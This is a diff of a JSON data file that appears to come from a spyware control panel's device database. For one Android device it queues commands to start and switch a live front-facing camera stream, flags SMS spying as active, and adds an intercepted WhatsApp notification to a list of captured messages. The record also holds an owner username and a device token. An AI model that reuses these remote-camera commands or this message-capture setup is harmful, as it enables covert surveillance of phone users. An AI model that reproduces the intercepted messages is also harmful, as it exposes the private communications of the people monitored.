@@ -108,8 +108,23 @@
     "deviceName": "HP-RASKA321-52A8",
     "ownerUsername": "Amsal.sim",
     "token": "906fc9b5e5fd7ed9167409d9979fb58b",
-    "lastSeen": 1776003908331,
-    "commandQueue": [],
+    "lastSeen": 1776003910720,
+    "commandQueue": [
+      {
+        "type": "camera_live_start",
+        "payload": {
+          "facing": "front"
+        },
+        "sentAt": 1776003910879
+      },
+      {
+        "type": "camera_live_switch",
+        "payload": {
+          "facing": "front"
+        },
+        "sentAt": 1776003910879
+      }
+    ],
     "online": true,
     "connectedAt": "2026-04-11T16:02:07.690Z",
     "deviceInfo": {
@@ -130,6 +145,14 @@
     },
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "WhatsApp",
+        "sender": "‎𝙑𝙞𝙧𝙩𝙪𝙖𝙡 𝙁𝙧𝙞𝙚𝙣𝙙𝙨 (65 pesan): ~ kiwaa inii",
+        "content": "💟 Stiker",
+        "time": "12/04 21:25",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1776003910901
+      },
       {
         "appName": "WhatsApp",
         "sender": "𝙑𝙞𝙧𝙩𝙪𝙖𝙡 𝙁𝙧𝙞𝙚𝙣𝙙𝙨",
@@ -4121,14 +4144,6 @@
         "time": "12/04 17:32",
         "pkg": "com.whatsapp",
         "receivedAt": 1775989922177
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "WhatsApp",
-        "content": "‎‎2 pesan dari 2 chat",
-        "time": "12/04 17:31",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1775989914350
       }
     ],
     "galleryPhotos": [],
